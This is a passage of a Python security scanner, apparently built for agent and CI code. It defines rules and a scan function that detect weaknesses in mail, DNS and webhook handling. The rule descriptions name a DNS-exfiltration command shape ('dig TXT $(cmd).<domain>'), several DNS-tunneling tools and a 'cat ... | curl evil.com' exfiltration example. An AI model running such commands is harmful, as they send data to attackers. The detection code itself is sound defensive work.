            "name in a trust check (`endswith('.github.com')`) without a "
            "forward `gethostbyname(name) -> ips` round-trip to confirm. "
            "The reverse-DNS record is controlled by the IP-block owner "
            "— an attacker with a rented `198.51.100.0/24` sets PTRs to "
            "`*.github.com` and bypasses the IP gate."
        ),
        pattern=_REVERSE_DNS_TRIGGER,
        owasp_asi="ASI-07",
    ),
    Rule(
        id="dns-webhook-secret-unset-bypass",
        name="Webhook signature verification skipped when secret unset",
        severity="CRITICAL",
        description=(
            "Handler contains `if (!secret) { warn(...); next(); }` or "
            "`if not webhook_secret: return True` — 'no secret "
            "configured' is treated as 'let it through'. A fresh "
            "deployment that forgot `GITHUB_WEBHOOK_SECRET` is publicly "
            "callable; any unauthenticated POST to /webhook is acted on "
            "as if it were a real GitHub event. Source: OpsSentinel "
            "webhook.js lines 27-30."
        ),
        pattern=_WEBHOOK_SECRET_BYPASS,
        owasp_asi="ASI-07",
    ),
    Rule(
        id="dns-tunneling-tool-shape",
        name="DNS-tunneling tool / `dig TXT $(cmd).<domain>` shape",
        severity="CRITICAL",
        description=(
            "Shell command contains `dig TXT $(cmd).<domain>` (the "
            "canonical DNS-exfil shape) OR a known DNS-tunnel binary "
            "(`iodine`, `dnscat`, `dnscat2`, `dnstunnel`, `nstx`, "
            "`tcp-over-dns`). The bash PreToolUse guard in many agent "
            "sentinels covers `cat ... | curl evil.com` but not the "
            "DNS-tunnel set. Source: narthex pre_bash.py omission."
        ),
        pattern=_DNS_TUNNEL,
        owasp_asi="ASI-02",
    ),
    Rule(
        id="dns-ci-mail-dns-host-not-vendor",
        name="CI workflow YAML pins SMTP/MAIL/DNS host to non-vendor literal",
        severity="MEDIUM",
        description=(
            "`SMTP_HOST: <literal>` / `MAIL_HOST: ...` / `DNS_SERVER: "
            "...` in a workflow YAML where the literal is NOT a known "
            "vendor (Gmail / O365 / SendGrid / Mailgun / SES / Postmark "
            "/ Brevo). Workflow YAML edits land in a PR; an attacker who "
            "lands a 'typo fix' that swaps the SMTP host diverts every "
            "publish-time mail (release tarball checksum, changelog, "
            "publish token) to themselves."
        ),
        pattern=_CI_MAIL_DNS_HOST_TRIGGER,
        owasp_asi="ASI-05",
    ),
    Rule(
        id="dns-email-allowlist-no-nfkc",
        name="Email allowlist compared without NFKC Unicode normalization",
        severity="HIGH",
        description=(
            "Email allowlist comparison without prior NFKC normalization "
            "+ ASCII-only check. Mailbox-local parts with combining "
            "characters (`a` + U+0301 → `á`), RTL-override (U+202E), or "
            "ZWNJ smuggling pass canonical 'looks like email' regex but "
            "route to different mailboxes at the receiving MTA. "
            "Complements the IDNA rule: IDNA fixes the domain side, NFKC "
            "fixes the local-part side."
        ),
        pattern=_EMAIL_ALLOWLIST_TRIGGER,
        owasp_asi="ASI-07",
    ),
    Rule(
        id="dns-webhook-toctou-dns-rebind",
        name="Webhook URL re-resolved every send in long-lived listener",
        severity="MEDIUM",
        description=(
            "Webhook POST inside a long-lived handler (express handler, "
            "asyncio task, setInterval) where the URL string is fixed "
            "but DNS is resolved fresh on every send. The boot-time SSRF "
            "check is meaningless an hour later — attacker rebinds the "
            "record and the next alert ships to them. Mitigation: cache "
            "the IP at boot, pin via `httpsAgent` / custom resolver."
        ),
        pattern=_WEBHOOK_TOCTOU_LONGLIVED_TRIGGER,
        owasp_asi="ASI-04",
    ),
    Rule(
        id="dns-mail-transport-tls-reject-disabled",
        name="Mail transport with TLS cert verification disabled",
        severity="CRITICAL",
        description=(
            "nodemailer transport with `rejectUnauthorized: false`, "
            "smtplib with `ssl._create_unverified_context()`, or "
            "process-wide `NODE_TLS_REJECT_UNAUTHORIZED=0`. On the mail "
            "egress path this means any on-path attacker on the route "
            "to the relay serves their own cert and decrypts the alert "
            "body. Combined with DNS rebind, full MITM. No exceptions, "
            "no per-env override."
        ),
        pattern=_MAIL_TLS_OFF,
        owasp_asi="ASI-04",
    ),
)


# ---- The composed scanner ------------------------------------------------


def _line_col(text: str, offset: int) -> tuple[int, int]:
    """Convert a string offset into (1-based line, 1-based column)."""
    before = text[:offset]
    line = before.count("\n") + 1
    col = offset - (before.rfind("\n") + 1) + 1
    return (line, col)


def _line_text(text: str, line_no: int) -> str:
    """Return the full text of the 1-based line_no without trailing newline."""
    lines = text.split("\n")
    if 1 <= line_no <= len(lines):
        return lines[line_no - 1]
    return ""


def _file_contains_any(text: str, guards: tuple[re.Pattern, ...]) -> bool:
    """True if ANY of the guard patterns match anywhere in the file."""
    return any(g.search(text) is not None for g in guards)


def _is_dkim_context(text: str) -> bool:
    """Rule 7 only fires on RSA-key blocks when the file references DKIM."""
    return _file_contains_any(text, _DKIM_CONTEXT_GUARDS)


def _ci_value_is_vendor(value: str) -> bool:
    """True if the YAML value is a known mail/DNS vendor — used by rule 12.

    Conservative: an exact match against TRUSTED_MAIL_VENDORS, OR a suffix
    match (e.g. `email-smtp.eu-central-1.amazonaws.com` matches
    `amazonaws.com`), OR a generic vendor TLD on the resolver side
    (`8.8.8.8` / `1.1.1.1` cloud DNS literals). We also accept any
    `${{ secrets.* }}` template — but those are handled at the regex
    layer (the value capture group does not match secret-templates).
    """
    v = value.lower().strip().strip("\"'")
    if not v:
        return True
    if v in TRUSTED_MAIL_VENDORS:
        return True
    # AWS SES regional wildcard: email-smtp.<region>.amazonaws.com
    if v.startswith("email-smtp.") and v.endswith(".amazonaws.com"):
        return True
    # SendGrid alt host
    if v.endswith(".sendgrid.net"):
        return True
    # Mailgun alt host
    if v.endswith(".mailgun.org") or v.endswith(".mailgun.net"):
        return True
    # Public resolvers
    if v in {"8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "9.9.9.9",
             "208.67.222.222", "208.67.220.220"}:
        return True
    # Localhost / loopback for self-hosted test relays
    if v in {"localhost", "127.0.0.1", "::1"}:
        return True
    return False


def scan_text(text: str) -> list[Finding]:
    """Run every applicable RULES pattern against `text` and return findings.

    Two-stage rules:

      * Rule 1 (smtp-tls-not-enforced) suppresses when any TLS-enforcement
        guard is present in the file (`requireTLS: true`, `secure: true`,
        `tls: { rejectUnauthorized: true }`, etc.). Python smtplib trigger
        suppressed when `.starttls()` / `SMTP_SSL` present in file.
      * Rule 2 (smtp-header-injection-unsanitized) suppresses when the
        same line carries a CRLF-stripping sanitizer.
      * Rule 3 (dns-rebinding-no-pin) suppresses when any DNS-pinning
        guard appears anywhere in the file.
      * Rule 5 (webhook-url-no-allowlist) suppresses when any webhook
        host allowlist guard appears in the file.
      * Rule 6 (email-allowlist-no-idna) suppresses when any IDNA /
        punycode guard appears in the file.
      * Rule 7 (dkim-weak-rsa-key) only fires when file references DKIM.
      * Rule 9 (reverse-dns-trust-no-fcrdns) suppresses when forward-DNS
        guards appear after the gethostbyaddr trigger.
      * Rule 12 (ci-mail-dns-host-not-vendor) suppresses when the value
        matches the vendor allowlist.
      * Rule 13 (email-allowlist-no-nfkc) suppresses when any NFKC /
        NFC guard appears in the file.
      * Rule 14 (webhook-toctou-dns-rebind) requires BOTH a long-lived
        signal AND absence of DNS-pin guards in the file.

    Findings are deduped by (rule_id, line, col).
    """
    if not text:
        return []

    # File-level guards evaluated once per scan (cheap, linear).
    smtp_tls_node_safe = _file_contains_any(text, _SMTP_TLS_NODEMAILER_GUARDS)
    smtp_tls_py_safe = _file_contains_any(text, _SMTP_TLS_PY_GUARDS)
    dns_pin_safe = _file_contains_any(text, _DNS_PIN_GUARDS)
    webhook_allowlist_safe = _file_contains_any(text, _WEBHOOK_ALLOWLIST_GUARDS)
    idna_safe = _file_contains_any(text, _IDNA_GUARDS)
    nfkc_safe = _file_contains_any(text, _EMAIL_NFKC_GUARDS)
    fcrdns_safe = _file_contains_any(text, _FCRDNS_GUARDS)
    long_lived = _file_contains_any(text, _LONG_LIVED_SIGNALS)
    toctou_pin_safe = _file_contains_any(text, _TOCTOU_PIN_GUARDS)

    findings: list[Finding] = []
    seen: set[tuple[str, int, int]] = set()

    # ---- Rule 1 — nodemailer + Python smtplib triggers ------------------
    for m in _SMTP_TLS_NODEMAILER_TRIGGER.finditer(text):
        if smtp_tls_node_safe:
            continue
        line, col = _line_col(text, m.start())
        _emit(findings, seen, "dns-smtp-tls-not-enforced", line, col, m.group(0))
    for m in _SMTP_TLS_PY_TRIGGER.finditer(text):
        if smtp_tls_py_safe:
            continue
        line, col = _line_col(text, m.start())
        _emit(findings, seen, "dns-smtp-tls-not-enforced", line, col, m.group(0))

    # ---- Rule 2 — header injection (per-line sanitizer carve-out) -------
    for m in _SMTP_HEADER_INJECTION.finditer(text):
        line, col = _line_col(text, m.start())
        ln = _line_text(text, line)
        if _CRLF_SANITIZER_SAMELINE.search(ln) is not None:
            continue
        _emit(findings, seen, "dns-smtp-header-injection-unsanitized",
              line, col, m.group(0))

    # ---- Rule 3 — DNS rebinding (file-level negative guard) -------------
    if not dns_pin_safe:
        for m in _DNS_REBIND_HTTP_CALL.finditer(text):
            line, col = _line_col(text, m.start())
            _emit(findings, seen, "dns-rebinding-no-pin", line, col, m.group(0))

    # ---- Rule 4 — allow_redirects=True / fetch follow -------------------
    for m in _REDIRECT_FOLLOW_TRIGGER.finditer(text):
        line, col = _line_col(text, m.start())
        _emit(findings, seen, "dns-http-follow-redirects-untrusted",
              line, col, m.group(0))

    # ---- Rule 5 — webhook URL no allowlist ------------------------------
    if not webhook_allowlist_safe:
        for m in _WEBHOOK_NO_ALLOWLIST.finditer(text):
            line, col = _line_col(text, m.start())
            _emit(findings, seen, "dns-webhook-url-no-allowlist",
                  line, col, m.group(0))

    # ---- Rule 6 — email allowlist without IDNA --------------------------
    if not idna_safe:
        for m in _EMAIL_ALLOWLIST_TRIGGER.finditer(text):
            line, col = _line_col(text, m.start())
            _emit(findings, seen, "dns-email-allowlist-no-idna",
                  line, col, m.group(0))

    # ---- Rule 7 — DKIM weak RSA key -------------------------------------
    if _is_dkim_context(text):
        for m in _DKIM_WEAK_RSA_KEY.finditer(text):
            line, col = _line_col(text, m.start())
            _emit(findings, seen, "dns-dkim-weak-rsa-key",
                  line, col, m.group(0))

    # ---- Rule 8 — SPF / DMARC permissive --------------------------------
    for m in _SPF_DMARC_PERMISSIVE.finditer(text):
        line, col = _line_col(text, m.start())
        _emit(findings, seen, "dns-spf-dmarc-permissive",
              line, col, m.group(0))

    # ---- Rule 9 — reverse DNS no FCrDNS ---------------------------------
    if not fcrdns_safe:
        for m in _REVERSE_DNS_TRIGGER.finditer(text):
            line, col = _line_col(text, m.start())
            _emit(findings, seen, "dns-reverse-dns-trust-no-fcrdns",
                  line, col, m.group(0))

    # ---- Rule 10 — webhook secret unset bypass --------------------------
    for m in _WEBHOOK_SECRET_BYPASS.finditer(text):
        line, col = _line_col(text, m.start())
        _emit(findings, seen, "dns-webhook-secret-unset-bypass",
              line, col, m.group(0))

    # ---- Rule 11 — DNS tunneling ----------------------------------------
    for m in _DNS_TUNNEL.finditer(text):
        line, col = _line_col(text, m.start())
        _emit(findings, seen, "dns-tunneling-tool-shape",
              line, col, m.group(0))

    # ---- Rule 12 — CI mail/DNS host non-vendor --------------------------
    for m in _CI_MAIL_DNS_HOST_TRIGGER.finditer(text):
        value = m.group(1) if m.lastindex else ""
        if _ci_value_is_vendor(value):
            continue
        # Suppress secret-template values — the regex doesn't capture them
        # but a `${{ secrets.X }}` literal in YAML would be parsed by the
        # YAML loader; in raw-text scanning we just exclude lines that
        # contain "${{" near the key.
        ln = _line_text(text, _line_col(text, m.start())[0])
        if "${{" in ln:
            continue
        line, col = _line_col(text, m.start())
        _emit(findings, seen, "dns-ci-mail-dns-host-not-vendor",
              line, col, m.group(0))

    # ---- Rule 13 — email allowlist no NFKC ------------------------------
    if not nfkc_safe:
        for m in _EMAIL_ALLOWLIST_TRIGGER.finditer(text):
            line, col = _line_col(text, m.start())
            _emit(findings, seen, "dns-email-allowlist-no-nfkc",
                  line, col, m.group(0))

    # ---- Rule 14 — webhook TOCTOU DNS rebind ----------------------------
    # Only fires when: long-lived process AND no DNS-pin guard.
    if long_lived and not toctou_pin_safe:
        for m in _WEBHOOK_TOCTOU_LONGLIVED_TRIGGER.finditer(text):
            line, col = _line_col(text, m.start())
            _emit(findings, seen, "dns-webhook-toctou-dns-rebind",
                  line, col, m.group(0))

    # ---- Rule 15 — mail transport TLS reject disabled -------------------
    for m in _MAIL_TLS_OFF.finditer(text):
        line, col = _line_col(text, m.start())
        _emit(findings, seen, "dns-mail-transport-tls-reject-disabled",
              line, col, m.group(0))

    findings.sort(key=lambda f: (f.line, f.column, f.rule_id))
    return findings


# Rule-id → description / severity / asi lookup, populated lazily so the
# `_emit` helper is one cheap line.
_RULE_BY_ID: dict[str, Rule] = {r.id: r for r in RULES}


def _emit(
    findings: list[Finding],
    seen: set[tuple[str, int, int]],
    rule_id: str,
    line: int,
    col: int,
    matched: str,
) -> None:
    """Append a Finding to `findings`, deduping by (rule_id, line, col).
    Matched text is truncated at 200 chars to keep heartbeat output small.
    """
    key = (rule_id, line, col)
    if key in seen:
        return
    seen.add(key)
    rule = _RULE_BY_ID[rule_id]
    text = matched if len(matched) <= 200 else matched[:200] + "…"
    findings.append(Finding(
        rule_id=rule_id,
        line=line,
        column=col,
        matched_text=text,
        severity=rule.severity,
        description=rule.description,
        owasp_asi=rule.owasp_asi,
    ))
